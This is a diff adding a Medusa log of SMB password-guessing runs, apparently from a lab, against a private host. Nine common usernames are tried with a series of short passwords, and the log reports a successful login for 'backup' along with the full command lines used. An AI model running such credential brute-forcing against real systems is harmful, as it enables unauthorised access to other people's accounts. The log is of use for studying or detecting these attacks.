@@ -1,0 +1,286 @@
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-10-29 15:11:36 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: admin (1 of 9, 0 complete) Password: 12ab (1 of 1 complete)
+2026-10-29 15:11:36 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: administrator (2 of 9, 1 complete) Password: 12ab (1 of 1 complete)
+2026-10-29 15:11:36 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: root (3 of 9, 2 complete) Password: 12ab (1 of 1 complete)
+2026-10-29 15:11:36 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: user (4 of 9, 3 complete) Password: 12ab (1 of 1 complete)
+2026-10-29 15:11:36 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: test (5 of 9, 4 complete) Password: 12ab (1 of 1 complete)
+2026-10-29 15:11:36 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: guest (6 of 9, 5 complete) Password: 12ab (1 of 1 complete)
+2026-10-29 15:11:36 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: support (7 of 9, 6 complete) Password: 12ab (1 of 1 complete)
+2026-10-29 15:11:36 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: backup (8 of 9, 7 complete) Password: 12ab (1 of 1 complete)
+2026-10-29 15:11:36 ACCOUNT FOUND: [smbnt] Host: 172.28.0.12 User: backup Password: 12ab [SUCCESS (ADMIN$ - Share Unavailable)]
+2026-10-29 15:11:36 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: adm (9 of 9, 8 complete) Password: 12ab (1 of 1 complete)
+# Medusa v.2.3 (2026-10-29 15:11:36)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 12ab -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+2026-10-29 15:11:36 ACCOUNT FOUND: [smbnt] Host: 172.28.0.12 User: backup Password: 12ab [SUCCESS (ADMIN$ - Share Unavailable)]
+# Medusa has finished (2026-10-29 15:11:36).
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: admin (1 of 9, 0 complete) Password: 34cd (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: administrator (2 of 9, 1 complete) Password: 34cd (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: root (3 of 9, 2 complete) Password: 34cd (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: user (4 of 9, 3 complete) Password: 34cd (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: test (5 of 9, 4 complete) Password: 34cd (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: guest (6 of 9, 5 complete) Password: 34cd (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: support (7 of 9, 6 complete) Password: 34cd (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: backup (8 of 9, 7 complete) Password: 34cd (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: adm (9 of 9, 8 complete) Password: 34cd (1 of 1 complete)
+# Medusa v.2.3 (2026-10-29 15:11:36)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 12ab -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+2026-10-29 15:11:36 ACCOUNT FOUND: [smbnt] Host: 172.28.0.12 User: backup Password: 12ab [SUCCESS (ADMIN$ - Share Unavailable)]
+# Medusa has finished (2026-10-29 15:11:36).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 34cd -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: admin (1 of 9, 0 complete) Password: 56ef (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: administrator (2 of 9, 1 complete) Password: 56ef (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: root (3 of 9, 2 complete) Password: 56ef (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: user (4 of 9, 3 complete) Password: 56ef (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: test (5 of 9, 4 complete) Password: 56ef (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: guest (6 of 9, 5 complete) Password: 56ef (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: support (7 of 9, 6 complete) Password: 56ef (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: backup (8 of 9, 7 complete) Password: 56ef (1 of 1 complete)
+2026-10-29 15:11:37 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: adm (9 of 9, 8 complete) Password: 56ef (1 of 1 complete)
+# Medusa v.2.3 (2026-10-29 15:11:36)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 12ab -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+2026-10-29 15:11:36 ACCOUNT FOUND: [smbnt] Host: 172.28.0.12 User: backup Password: 12ab [SUCCESS (ADMIN$ - Share Unavailable)]
+# Medusa has finished (2026-10-29 15:11:36).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 34cd -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 56ef -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: admin (1 of 9, 0 complete) Password: 78gh (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: administrator (2 of 9, 1 complete) Password: 78gh (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: root (3 of 9, 2 complete) Password: 78gh (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: user (4 of 9, 3 complete) Password: 78gh (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: test (5 of 9, 4 complete) Password: 78gh (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: guest (6 of 9, 5 complete) Password: 78gh (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: support (7 of 9, 6 complete) Password: 78gh (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: backup (8 of 9, 7 complete) Password: 78gh (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: adm (9 of 9, 8 complete) Password: 78gh (1 of 1 complete)
+# Medusa v.2.3 (2026-10-29 15:11:36)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 12ab -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+2026-10-29 15:11:36 ACCOUNT FOUND: [smbnt] Host: 172.28.0.12 User: backup Password: 12ab [SUCCESS (ADMIN$ - Share Unavailable)]
+# Medusa has finished (2026-10-29 15:11:36).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 34cd -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 56ef -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 78gh -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: admin (1 of 9, 0 complete) Password: 90ij (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: administrator (2 of 9, 1 complete) Password: 90ij (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: root (3 of 9, 2 complete) Password: 90ij (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: user (4 of 9, 3 complete) Password: 90ij (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: test (5 of 9, 4 complete) Password: 90ij (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: guest (6 of 9, 5 complete) Password: 90ij (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: support (7 of 9, 6 complete) Password: 90ij (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: backup (8 of 9, 7 complete) Password: 90ij (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: adm (9 of 9, 8 complete) Password: 90ij (1 of 1 complete)
+# Medusa v.2.3 (2026-10-29 15:11:36)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 12ab -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+2026-10-29 15:11:36 ACCOUNT FOUND: [smbnt] Host: 172.28.0.12 User: backup Password: 12ab [SUCCESS (ADMIN$ - Share Unavailable)]
+# Medusa has finished (2026-10-29 15:11:36).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 34cd -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 56ef -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 78gh -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 90ij -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: admin (1 of 9, 0 complete) Password: 01kl (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: administrator (2 of 9, 1 complete) Password: 01kl (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: root (3 of 9, 2 complete) Password: 01kl (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: user (4 of 9, 3 complete) Password: 01kl (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: test (5 of 9, 4 complete) Password: 01kl (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: guest (6 of 9, 5 complete) Password: 01kl (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: support (7 of 9, 6 complete) Password: 01kl (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: backup (8 of 9, 7 complete) Password: 01kl (1 of 1 complete)
+2026-10-29 15:11:38 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: adm (9 of 9, 8 complete) Password: 01kl (1 of 1 complete)
+# Medusa v.2.3 (2026-10-29 15:11:36)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 12ab -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+2026-10-29 15:11:36 ACCOUNT FOUND: [smbnt] Host: 172.28.0.12 User: backup Password: 12ab [SUCCESS (ADMIN$ - Share Unavailable)]
+# Medusa has finished (2026-10-29 15:11:36).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 34cd -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 56ef -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 78gh -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 90ij -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 01kl -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: admin (1 of 9, 0 complete) Password: 23mn (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: administrator (2 of 9, 1 complete) Password: 23mn (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: root (3 of 9, 2 complete) Password: 23mn (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: user (4 of 9, 3 complete) Password: 23mn (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: test (5 of 9, 4 complete) Password: 23mn (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: guest (6 of 9, 5 complete) Password: 23mn (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: support (7 of 9, 6 complete) Password: 23mn (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: backup (8 of 9, 7 complete) Password: 23mn (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: adm (9 of 9, 8 complete) Password: 23mn (1 of 1 complete)
+# Medusa v.2.3 (2026-10-29 15:11:36)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 12ab -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+2026-10-29 15:11:36 ACCOUNT FOUND: [smbnt] Host: 172.28.0.12 User: backup Password: 12ab [SUCCESS (ADMIN$ - Share Unavailable)]
+# Medusa has finished (2026-10-29 15:11:36).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 34cd -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 56ef -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 78gh -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 90ij -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 01kl -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:39)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 23mn -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:39).
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: admin (1 of 9, 0 complete) Password: 45op (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: administrator (2 of 9, 1 complete) Password: 45op (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: root (3 of 9, 2 complete) Password: 45op (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: user (4 of 9, 3 complete) Password: 45op (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: test (5 of 9, 4 complete) Password: 45op (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: guest (6 of 9, 5 complete) Password: 45op (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: support (7 of 9, 6 complete) Password: 45op (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: backup (8 of 9, 7 complete) Password: 45op (1 of 1 complete)
+2026-10-29 15:11:39 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: adm (9 of 9, 8 complete) Password: 45op (1 of 1 complete)
+# Medusa v.2.3 (2026-10-29 15:11:36)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 12ab -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+2026-10-29 15:11:36 ACCOUNT FOUND: [smbnt] Host: 172.28.0.12 User: backup Password: 12ab [SUCCESS (ADMIN$ - Share Unavailable)]
+# Medusa has finished (2026-10-29 15:11:36).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 34cd -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 56ef -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 78gh -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 90ij -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 01kl -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:39)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 23mn -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:39).
+# Medusa v.2.3 (2026-10-29 15:11:39)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 45op -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:39).
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: admin (1 of 9, 0 complete) Password: 67qr (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: administrator (2 of 9, 1 complete) Password: 67qr (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: root (3 of 9, 2 complete) Password: 67qr (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: user (4 of 9, 3 complete) Password: 67qr (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: test (5 of 9, 4 complete) Password: 67qr (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: guest (6 of 9, 5 complete) Password: 67qr (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: support (7 of 9, 6 complete) Password: 67qr (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: backup (8 of 9, 7 complete) Password: 67qr (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: adm (9 of 9, 8 complete) Password: 67qr (1 of 1 complete)
+# Medusa v.2.3 (2026-10-29 15:11:36)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 12ab -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+2026-10-29 15:11:36 ACCOUNT FOUND: [smbnt] Host: 172.28.0.12 User: backup Password: 12ab [SUCCESS (ADMIN$ - Share Unavailable)]
+# Medusa has finished (2026-10-29 15:11:36).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 34cd -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 56ef -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 78gh -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
